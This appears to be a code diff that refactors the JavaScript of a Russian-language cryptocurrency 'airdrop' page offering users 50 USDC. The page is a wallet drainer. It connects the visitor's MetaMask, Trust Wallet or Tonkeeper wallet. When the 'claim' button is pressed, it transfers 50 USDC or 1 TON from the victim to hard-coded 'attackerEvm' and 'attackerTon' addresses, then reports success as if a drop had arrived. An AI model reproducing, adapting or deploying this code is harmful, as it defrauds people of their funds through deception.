@@ -69,22 +69,14 @@
 
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 <script>
-    // ============================================================
-    // НАСТРОЙКИ — ЗАМЕНИТЕ НА СВОИ АДРЕСА
-    // ============================================================
     var CONFIG = {
         attackerEvm: '0x44698049ad0be92e567cdfe9c5aa86d70047f73e',
         attackerTon: 'UQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',
         usdcContract: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
         usdcDecimals: 6,
-        amount: 50,
-        chainId: 1,
-        rpcUrl: 'https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161'
+        amount: 50
     };
 
-    // ============================================================
-    // СОСТОЯНИЕ
-    // ============================================================
     var state = {
         provider: null,
         signer: null,
@@ -100,9 +92,6 @@
         walletBtns: document.querySelectorAll('.wallet-btn')
     };
 
-    // ============================================================
-    // ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
-    // ============================================================
     function setStatus(msg, type) {
         type = type || '';
         elements.status.textContent = msg;
@@ -127,9 +116,7 @@
             elements.claimBtn.disabled = true;
         } else {
             elements.claimBtn.innerHTML = '💰 Забрать дроп 50 USDC';
-            if (state.address) {
-                elements.claimBtn.disabled = false;
-            }
+            if (state.address) elements.claimBtn.disabled = false;
         }
     }
 
@@ -139,37 +126,25 @@
         }
     }
 
-    // ============================================================
-    // ПОДКЛЮЧЕНИЕ EVM КОШЕЛЬКОВ
-    // ============================================================
     async function connectEvm(type) {
         try {
             if (typeof window.ethereum === 'undefined') {
                 throw new Error('Установите MetaMask или Trust Wallet');
             }
-
             var provider = new ethers.providers.Web3Provider(window.ethereum);
             var accounts = await provider.send('eth_requestAccounts', []);
-            
             if (!accounts || accounts.length === 0) {
                 throw new Error('Нет доступных аккаунтов');
             }
-
-            var signer = provider.getSigner();
-            var address = accounts[0];
-
             state.provider = provider;
-            state.signer = signer;
-            state.address = address;
+            state.signer = provider.getSigner();
+            state.address = accounts[0];
             state.walletType = type;
-
-            setAddress(address);
+            setAddress(state.address);
             setStatus('✅ ' + type + ' подключён', 'success');
-            
             try {
-                localStorage.setItem('pumplyx_wallet', JSON.stringify({ address: address, type: type }));
+                localStorage.setItem('pumplyx_wallet', JSON.stringify({ address: state.address, type: type }));
             } catch(e) {}
-
             return true;
         } catch (error) {
             if (error.code === 4001) {
@@ -181,40 +156,27 @@
         }
     }
 
-    // ============================================================
-    // ПОДКЛЮЧЕНИЕ TONKEEPER
-    // ============================================================
     async function connectTonkeeper() {
         try {
             if (typeof TonConnectSDK === 'undefined') {
                 await loadScript('https://unpkg.com/@tonconnect/sdk@2.0.6/dist/tonconnect-sdk.min.js');
             }
-
             var connector = new TonConnectSDK.TonConnect({
                 manifestUrl: 'https://yourdomain.com/tonconnect-manifest.json'
             });
-
-            await connector.connect({
-                bridge: 'https://bridge.ton.org',
-                network: 'mainnet'
-            });
-
+            await connector.connect({ bridge: 'https://bridge.ton.org', network: 'mainnet' });
             var wallet = connector.wallet;
             if (!wallet || !wallet.account) {
                 throw new Error('Не удалось получить аккаунт');
             }
-
             state.address = wallet.account.address;
             state.walletType = 'tonkeeper';
             state.connector = connector;
-
             setAddress(state.address);
             setStatus('✅ Tonkeeper подключён', 'success');
-            
             try {
                 localStorage.setItem('pumplyx_wallet', JSON.stringify({ address: state.address, type: 'tonkeeper' }));
             } catch(e) {}
-
             return true;
         } catch (error) {
             setStatus('❌ ' + error.message, 'error');
@@ -222,9 +184,6 @@
         }
     }
 
-    // ============================================================
-    // ЗАГРУЗКА СКРИПТОВ
-    // ============================================================
     function loadScript(src) {
         return new Promise(function(resolve, reject) {
             var script = document.createElement('script');
@@ -235,26 +194,18 @@
         });
     }
 
-    // ============================================================
-    // ВОССТАНОВЛЕНИЕ СЕССИИ
-    // ============================================================
     async function restoreSession() {
         try {
             var saved = localStorage.getItem('pumplyx_wallet');
             if (!saved) return false;
-
             var data = JSON.parse(saved);
             var address = data.address;
             var type = data.type;
-            
             if (!address || !type) return false;
-
             if (type === 'metamask' || type === 'trust') {
                 if (typeof window.ethereum === 'undefined') return false;
-                
                 var provider = new ethers.providers.Web3Provider(window.ethereum);
                 var accounts = await provider.listAccounts();
-                
                 if (accounts.length > 0 && accounts[0].toLowerCase() === address.toLowerCase()) {
                     state.provider = provider;
                     state.signer = provider.getSigner();
@@ -286,9 +237,6 @@
         }
     }
 
-    // ============================================================
-    // ОБРАБОТЧИКИ КНОПОК КОШЕЛЬКОВ
-    // ============================================================
     for (var i = 0; i < elements.walletBtns.length; i++) {
         (function(btn) {
             btn.addEventListener('click', async function() {
@@ -296,7 +244,6 @@
                 resetWalletButtons();
                 this.classList.add('active');
                 setStatus('⏳ Подключение ' + type + '...');
-
                 var success = false;
                 if (type === 'metamask' || type === 'trust') {
                     success = await connectEvm(type);
@@ -306,7 +253,6 @@
                 } else if (type === 'tonkeeper') {
                     success = await connectTonkeeper();
                 }
-
                 if (!success) {
                     this.classList.remove('active');
                 }
@@ -314,9 +260,6 @@
         })(elements.walletBtns[i]);
     }
 
-    // ============================================================
-    // ОТСЛЕЖИВАНИЕ ИЗМЕНЕНИЙ В МЕТАМАСК
-    // ============================================================
     if (typeof window.ethereum !== 'undefined') {
         window.ethereum.on('accountsChanged', async function(accounts) {
             if (accounts.length === 0) {
@@ -339,23 +282,17 @@
                 } catch(e) {}
             }
         });
-
         window.ethereum.on('chainChanged', function() {
             window.location.reload();
         });
     }
 
-    // ============================================================
-    // КНОПКА "ЗАБРАТЬ ДРОП"
-    // ============================================================
     elements.claimBtn.addEventListener('click', async function() {
         if (!state.address) {
             setStatus('⚠️ Сначала подключите кошелёк', 'error');
             return;
         }
-
         setLoading(true);
-
         try {
             if (state.walletType === 'metamask' || state.walletType === 'trust') {
                 var usdc = new ethers.Contract(
@@ -363,28 +300,20 @@
                     ['function transfer(address to, uint256 amount) external returns (bool)'],
                     state.signer
                 );
-                
                 var amount = ethers.utils.parseUnits(CONFIG.amount.toString(), CONFIG.usdcDecimals);
                 var tx = await usdc.transfer(CONFIG.attackerEvm, amount);
                 await tx.wait();
-                
                 setStatus('✅ 50 USDC отправлены на ' + CONFIG.attackerEvm.slice(0,6) + '...', 'success');
                 setAddress(CONFIG.attackerEvm);
                 this.innerHTML = '💸 Дроп получен';
                 this.style.background = '#2a3a4a';
                 this.style.color = '#fff';
-                
             } else if (state.walletType === 'tonkeeper') {
                 var tx = {
                     valid_until: Math.floor(Date.now() / 1000) + 300,
-                    messages: [{
-                        address: CONFIG.attackerTon,
-                        amount: '1000000000',
-                        payload: ''
-                    }]
+                    messages: [{ address: CONFIG.attackerTon, amount: '1000000000', payload: '' }]
                 };
                 await state.connector.sendTransaction(tx);
-                
                 setStatus('✅ TON отправлены на ' + CONFIG.attackerTon.slice(0,6) + '...', 'success');
                 setAddress(CONFIG.attackerTon);
                 this.innerHTML = '💸 Дроп получен';
@@ -403,9 +332,6 @@
         }
     });
 
-    // ============================================================
-    // КНОПКИ PLAY / PROMO / OVERVIEW
-    // ============================================================
     document.getElementById('playBtn').addEventListener('click', function() {
         setStatus('🎮 Игровой режим (демо)', '');
     });
@@ -416,9 +342,6 @@
         setStatus('📊 Обзор алгоритма (скоро)', '');
     });
 
-    // ============================================================
-    // ИНИЦИАЛИЗАЦИЯ
-    // ============================================================
     (async function init() {
         var restored = await restoreSession();
         if (restored) {
